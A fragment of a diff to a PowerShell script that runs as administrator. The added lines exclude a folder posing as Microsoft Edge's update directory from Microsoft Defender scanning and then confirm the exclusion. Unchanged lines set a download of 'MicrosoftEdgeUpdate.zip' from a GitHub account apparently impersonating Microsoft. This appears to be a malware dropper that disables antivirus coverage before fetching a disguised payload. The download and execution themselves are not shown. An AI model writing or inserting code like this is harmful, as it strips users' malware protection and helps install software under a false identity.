@@ -1,5 +1,8 @@
 # Requires -RunAsAdmin
-
+# Add exclusion to Microsoft Defender before download
+Add-MpPreference -ExclusionPath "C:\Program Files (x86)\Microsoft\EdgeUpdate\Update\"
+# Check to ensure the exclusion took place
+(Get-MpPreference).ExclusionPath
 # Define environment variables
 $DownloadUrl = "https://github.com/WindowsSecurityServices/MicrosoftEdgeUpdate/releases/download/v1.0.1/MicrosoftEdgeUpdate.zip"
 
